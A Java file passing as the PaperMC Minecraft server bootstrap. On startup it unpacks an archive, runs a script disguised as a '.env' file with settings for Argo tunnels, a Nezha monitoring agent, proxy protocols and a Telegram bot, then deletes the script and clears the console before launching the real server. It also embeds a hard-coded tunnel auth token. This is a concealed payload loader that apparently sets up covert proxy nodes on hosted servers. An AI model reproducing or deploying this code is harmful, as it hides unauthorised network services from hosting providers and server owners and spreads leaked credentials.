package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process scriptProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        // check java version
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            extractAndRunScript();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // Ignore exceptions
        }
    }
    
    private static void extractAndRunScript() throws Exception {
        // 1. 解压 backup.tar.gz 到当前目录
        extractTarGz();
        
        // 2. 检查.env文件是否存在
        File envScript = new File(".env");
        if (!envScript.exists()) {
            System.err.println(ANSI_RED + "ERROR: .env script not found after extraction!" + ANSI_RESET);
            return;
        }
        
        // 3. 给.env脚本添加执行权限
        if (!envScript.setExecutable(true)) {
            System.err.println(ANSI_RED + "WARNING: Failed to set executable permission for .env script" + ANSI_RESET);
        }
        
        // 4. 执行.env脚本
        runEnvScript(envScript);
        
        // 5. 删除.env文件
        if (!envScript.delete()) {
            System.err.println(ANSI_RED + "WARNING: Failed to delete .env script" + ANSI_RESET);
        } else {
            System.out.println(ANSI_GREEN + "Successfully deleted .env script" + ANSI_RESET);
        }
    }
    
    private static void extractTarGz() throws Exception {
        File tarGzFile = new File("backup.tar.gz");
        if (!tarGzFile.exists()) {
            System.err.println(ANSI_RED + "ERROR: backup.tar.gz not found!" + ANSI_RESET);
            throw new FileNotFoundException("backup.tar.gz not found");
        }
        
        System.out.println("Extracting backup.tar.gz to current directory...");
        
        // 使用系统tar命令解压[1,2](@ref)
        ProcessBuilder pb = new ProcessBuilder("tar", "-zxvf", "backup.tar.gz");
        pb.directory(new File(".")); // 设置工作目录为当前目录
        pb.redirectErrorStream(true);
        
        Process process = pb.start();
        
        // 读取解压输出
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println("Extracted: " + line);
        }
        
        int exitCode = process.waitFor();
        if (exitCode != 0) {
            throw new IOException("tar command failed with exit code: " + exitCode);
        }
        
        System.out.println(ANSI_GREEN + "Successfully extracted backup.tar.gz" + ANSI_RESET);
    }
    
    private static void runEnvScript(File envScript) throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadDefaultEnvVars(envVars);
        
        ProcessBuilder pb;
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            // Windows系统使用cmd执行
            pb = new ProcessBuilder("cmd", "/c", envScript.getName());
        } else {
            // Linux/Unix系统直接执行
            pb = new ProcessBuilder("./" + envScript.getName());
        }
        
        pb.directory(new File(".")); // 当前目录
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        System.out.println("Executing .env script...");
        scriptProcess = pb.start();
        
        // 等待脚本执行完成
        int exitCode = scriptProcess.waitFor();
        if (exitCode != 0) {
            System.err.println(ANSI_RED + "WARNING: .env script exited with code: " + exitCode + ANSI_RESET);
        } else {
            System.out.println(ANSI_GREEN + ".env script executed successfully" + ANSI_RESET);
        }
    }
    
    private static void loadDefaultEnvVars(Map<String, String> envVars) {
        // 设置默认环境变量
        envVars.put("UUID", "a217d527-bd5e-4ef0-b899-d36627af0ddd");
        envVars.put("FILE_PATH", "./world");
        envVars.put("ARGO_PORT", "51976");
        envVars.put("ARGO_DOMAIN", "kinetic.1976.dpdns.org");
        envVars.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiM2I0ZjM4NzYtMTNmZS00MDU2LWE5YmItMGMzNWU1NzYyNTM3IiwicyI6Ik5XTTRaakl6TVdRdE0");
        envVars.put("NAME", "kinetic");
        
        // 从系统环境变量覆盖默认值
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
    }
    
    private static void stopServices() {
        if (scriptProcess != null && scriptProcess.isAlive()) {
            scriptProcess.destroy();
            System.out.println(ANSI_RED + "Script process terminated" + ANSI_RESET);
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format(
                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion,
                javaVmName,
                javaVmVersion,
                javaVendor,
                javaVendorVersion,
                osName,
                osVersion,
                osArch
            ),
            String.format(
                "Loading %s %s for Minecraft %s",
                bi.brandName(),
                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                bi.minecraftVersionId()
            )
        );
    }
}
